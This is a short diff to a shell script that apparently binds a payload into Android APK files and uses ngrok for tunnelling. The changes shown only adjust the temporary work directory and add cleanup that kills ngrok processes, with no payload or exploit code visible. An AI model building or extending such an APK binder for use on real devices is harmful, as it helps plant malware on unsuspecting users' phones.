@@ -38,9 +38,9 @@ line
 if [ $(echo $UID) -ne 0 ]; then echo -e "$red Run this Script as root !!"; echo -e $nocol; exit 1; fi
 
 # setting up work directory
-export work_dir="/tmp/apk-payload-$(date +%d%m%y_%H%M%S)"
+export work_dir="/tmp/apk-payload/$(date +%d%m%y_%H%M%S)"
 export cur_dir="$PWD"
-mkdir $work_dir
+mkdir -p $work_dir
 
 # check for xterm and install if not present
 if [ `which xterm | wc -l` -eq 0 ];then
@@ -148,3 +148,5 @@ if [ -n $apk_out ];then
 else echo -e "$red Unable to bind$green $apk_name $red!! $nocol"
 fi
 line
+killme=$(pidof `which ngrok`)
+if [ -n "$killme" ];then for p in "$killme";do kill -9 $p; done; fi
